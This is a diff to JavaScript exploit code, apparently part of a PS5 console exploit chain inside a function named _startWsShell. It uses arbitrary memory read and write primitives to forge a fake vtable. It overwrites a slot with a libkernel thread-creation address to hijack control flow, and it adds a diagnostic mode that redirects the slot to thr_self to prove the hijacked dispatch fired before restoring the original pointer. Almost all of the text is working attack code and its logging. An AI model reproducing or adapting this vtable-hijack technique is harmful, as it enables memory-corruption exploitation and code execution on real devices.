@@ -6240,7 +6240,9 @@ function _startWsShell(){
           /* (3) FAKEVT: copy VP-0x10..VP+0x38 (the RTTI precede + 6 slots + NULL), swap s3 (+0x18) */
           var FAKEVT=MBUF+0x4000n;
           for(var cI=0;cI<9;cI++)S.absWrite(FAKEVT+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
-          S.absWrite(FAKEVT+0x18n,lkF+0x13ED0n);   /* s3 = fontStateChanged (the PS5-fork +0x18) */
+          var s3T=(msg.diag&&msg.diag==='1')?(lkF+0x2C0n):(lkF+0x13ED0n);
+          S.absWrite(FAKEVT+0x18n,s3T);   /* s3 = fontStateChanged (+0x18 PS5-fork): diag=thr_self (the dispatch proof), else thr_create */
+          if(msg.diag&&msg.diag==='1')FB2('D DIAG MODE: s3=lk+0x2C0 (thr_self - the dispatch proof)');
           FB2('4 FAKEVT=0x'+FAKEVT.toString(16)+' s3=0x'+(lkF+0x13ED0n).toString(16));
           /* (4) the witness + the child stack */
           var WIT=MBUF+0x3000n;
@@ -6276,6 +6278,15 @@ function _startWsShell(){
            * may be synchronous - read immediately too) */
           var witPost=S.absRead(WIT,8)[0];
           FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
+          if(msg.diag&&msg.diag==='1'){
+            var foNow=S.absRead(FO,8)[0];
+            FB2('D [FO] now=0x'+foNow.toString(16)+' (FAKEVT was 0x'+FAKEVT.toString(16)+')');
+            reply.FOnow='0x'+foNow.toString(16);
+            if(foNow!==FAKEVT){FB2('D *** [FO] CHANGED - THE DISPATCH FIRED - tid=0x'+foNow.toString(16)+' ***');reply.dispatchProven=true;}
+            /* the restore: FO+0 back to the REAL VP so the engine continues safely */
+            S.absWrite(FO,vpOrig);
+            FB2('D FO.vtable restored to 0x'+vpOrig.toString(16));
+          }
           reply.witness={pre:'0x'+witPre.toString(16),post:'0x'+witPost.toString(16)};
           reply.vpOrig='0x'+vpOrig.toString(16);
           if(witPost!==witPre){FB2('A *** WITNESS CHANGED - THE CHILD RAN ***');reply.spawned=true;}
